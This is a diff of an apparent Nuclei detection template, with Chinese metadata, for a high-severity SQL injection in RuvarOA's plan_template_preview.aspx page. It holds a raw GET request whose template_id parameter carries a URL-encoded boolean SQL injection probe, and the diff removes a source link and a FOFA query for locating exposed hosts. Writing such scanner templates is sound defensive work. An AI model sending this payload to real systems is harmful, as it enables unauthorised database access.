@@ -3,14 +3,8 @@ info:
   name: RuvarOAplan_template_preview存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d3d9a3c9a49f8702555612260e2cd8bd
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: d3d9a3c9a49f8702555612260e2cd8bd
-    fofa: + fofa`body="txt_admin_key"`
 http:
 - raw:
   - 'GET /WorkPlan/plan_template_preview.aspx?template_id=%28SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281485%3D1485%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%29 HTTP/1.1
